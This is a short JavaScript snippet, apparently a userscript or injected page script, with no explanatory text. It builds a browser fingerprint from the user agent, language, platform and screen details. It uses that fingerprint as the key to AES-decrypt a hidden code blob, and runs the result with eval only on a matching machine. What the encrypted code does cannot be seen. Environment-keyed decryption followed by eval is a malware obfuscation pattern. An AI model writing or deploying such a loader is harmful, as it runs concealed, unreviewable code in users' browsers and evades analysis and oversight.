


(function() {
    'use strict';

    function loadCryptoJS(callback) {
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js';
        script.onload = callback;
        document.head.appendChild(script);
    }

    function decrypt(text, key) {
        try {
            const bytes = CryptoJS.AES.decrypt(text, key);
            return bytes.toString(CryptoJS.enc.Utf8);
        } catch (e) {
            console.error('Error decrypting:', e);
            return '';
        }
    }

    function gerarFingerprint() {
        const navigatorData = window.navigator;
        const fingerprint = [
            navigatorData.userAgent,
            navigatorData.language,
            navigatorData.platform,
            `${window.screen.width}x${window.screen.height}`,
            window.screen.colorDepth
        ].join('|');
        return fingerprint;
    }

    const encryptedCode = 'U2FsdGVkX1/QLSdYOAQt1aKidAMay5GfnYQ/LGw5xeKqlae5+wTuOUvU/OgOvLhikBHHdaD/dp1czi3uYnG7j25tVaFHXaayJRfd0xeae0BU7kfMuVpszERpU7tQBJi0NzWCV4OeGHZJXm0FvXzgipuR4n/pBmd3hGdZtz3l1TUbCn/2uBUHmXjAWXfKuHWPhB6JK/fK5Tl43zAEkC7mtjLKEFDAoRBmJUbHRMCcJTuQE4OggR4f0BX9EDZZyzda5/GOD6HSfkyQul7DTg24B/l2P/I3m0oUAiQQRdGtVmtQaPoG7JIbEe8z9ClNV9ABhIWKBRzACpJkD1D6KF1nZvygHKbbiLA73CGtpmnfc+mbNuQiX1AjnT6pDu9B+O6mgJ/6Asr7DRI2zUSi6RyzLHg23auFaKhB3mHPz8puLCOfHKxrqlIAqaluqg68zlIfgNf6GMJ/oLtjB5JHJIaAp7wS+scuQwo9Nvand9wyuu2cHf7PMVSClk/XDJ9iEFjbJXjoMDSev1R8SbCcQVmszHxE2oe82iCqdBmZIxSKjmRLcCf+mGSIVD/iIe7vY2y9Drhh6e4Ip9UafVbbfo6/PVqttR29M7Wb1fkmlmetKtT9zzpUKN+ZUF0TNn/2IqdRA1r99l4zo9qp5+BYZIyZjxvQWQkR6NeDb5VF6c8waf6j4+h5vlAj2nRWnlCEy9bz79XVQI6Qx+k11bvovn8OQJMYjykMFbh19+x4Wv8KfeCyCf0imXJ5WcbETsoR+wWgKgRVotvuZsdclNXacNi9dEOREOShYgFUKq+MYpbgsVl3uWf7JDuQ20VocV4JX4FY3vMvNQcztHaMrikTHw8ZiUcPemC0KzGmPFd2EIrEPftrOsOdA0rR1aOoaOznPFo8TxHfSkVBOCqtXTSz9u2KUUQnJ5YXlVyCIcrCQQbmdXYhBLKFGZSNM/3IPZCZRV/OSJWQSaB74WB7OfW7zWeQxpfBB94NVHz6YeRNf0Ebpu6Ysx0BL0qNQjTSKtnTNrgyM42kkLTXzxMslN69RzpHgF7bpVQAvPN42NXXZn9La9qJYJdeL2j840NQhOyXkrLRZARM0hwuSc4tOqUvmaUa5jaH2UkJv6sBnQ1VuAnLB6eO6JQaVSoD9ACbQt4Tu6REGteNYGxk0S6ViFf0/+wVUxVFpmcgauWIkJ94OP93GxQVzadm0zQZDuqFiExOvhCr4J6p5yJXMFaZq0McvcQX6zjm+Qbspp3pd8rT4IiXzq+gCjHqeblDv1CEYI8DCLO2lZYSst3piH7R2sCWsWp5GKM2OKHaFGjHuafRijylGZE9ilz9JEsRCzCEVf4c1Wyh5bSVsDvZN4RlVwbjORkATTMN9Rh1WxrR9ffo781I0m5Hm3W5BCAr4namkCrIyjYm5o1qddxBM2Cx0tyYiWXeqtJDc2v/vsBFzyUeRXehqa12vlub1rvdc9lBBxSHDJFSIEPJVBMSZn1iNM9WRRF+/6ot56S9ibbloxHMdLMZ3Okjm0yhdywrtqA+mlCsBg/kP+fDpxq5nvSd3pBd8tIXxOKa0PnOrkOkSeZvPZvTJ9cZRMVlSzeqwhncRLZGUh8xOi4k1LrKYLV4ONmCDMnSFcJV4fIIYTuJHOMlmcQYsTf/sJneVAOBMHOFP6rvI2faJY7r1nFn2JQQGGfBLo0dzmGMEEuXOXoOv1INpgmTC6RnLM9g+5Qm7H1s8tQO3cwh/TwqFvOXfm2AqTPIIRddNe+j4pXytHZUqYRVWo4Wqx1qNDAm2gBFcgpdihzcQl7EjfUVPj85NuLBZL2hVqMS3Q==';
    const encryptedFingerprint = 'U2FsdGVkX1/NvNwwkdfHReyJ3ACQxMdvgYRCc/i6x2r0JckyyIx1+/Z32ghr3e28d6VIjf2huCoaU+2YcwYb/uABAfXxocZ3RMpl3dy22KWDVFgeNJ+tF35dWderb3eszqw57Fy5okqdEIrAuSivvlWgsGWQF5is6vOsKYKaAnIAS67ZybJMLt4KdVt/1M+w4Y4pG4tnp7TAxEvZd35eMm8GP6VxxUSzdu9gr08MHVOvzRpFXjdT7QwT1YF9KbZK';
    const key = gerarFingerprint();

    loadCryptoJS(function() {
        const decryptedFingerprint = decrypt(encryptedFingerprint, key);
        if (gerarFingerprint() === decryptedFingerprint) {
            const decryptedCode = decrypt(encryptedCode, key);
            try {
                eval(decryptedCode);
            } catch (e) {
                console.error('Error evaluating code:', e);
            }
        } else {
            console.error('Fingerprint does not match.');
        }
    });
})();
        